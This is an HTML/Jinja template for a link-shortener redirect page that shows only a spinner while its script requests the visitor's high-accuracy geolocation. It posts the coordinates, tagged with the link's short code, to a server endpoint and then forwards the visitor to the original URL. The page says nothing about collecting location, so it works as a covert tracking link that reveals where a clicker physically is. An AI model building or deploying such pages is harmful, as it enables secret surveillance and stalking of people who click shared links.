<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ link.title }}</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body { height: 100%; }
body { background: #fff; display: flex; align-items: center; justify-content: center; }
.spinner {
  width: 48px; height: 48px; border: 5px solid #e0e0e0;
  border-top-color: #333; border-radius: 50%;
  animation: spin .8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="spinner"></div>
<script>
(function() {
  var sc = '{{ short_code }}';
  var url = {{ link.original_url|tojson }};
  function go() { setTimeout(function() { window.location.href = url; }, 2000); }
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        var x = new XMLHttpRequest();
        x.open('POST', '/api/location', true);
        x.setRequestHeader('Content-Type', 'application/json');
        x.onload = go;
        x.onerror = go;
        x.send(JSON.stringify({
          short_code: sc,
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }));
      },
      function() { go(); },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  } else { go(); }
})();
</script>
</body>
</html>
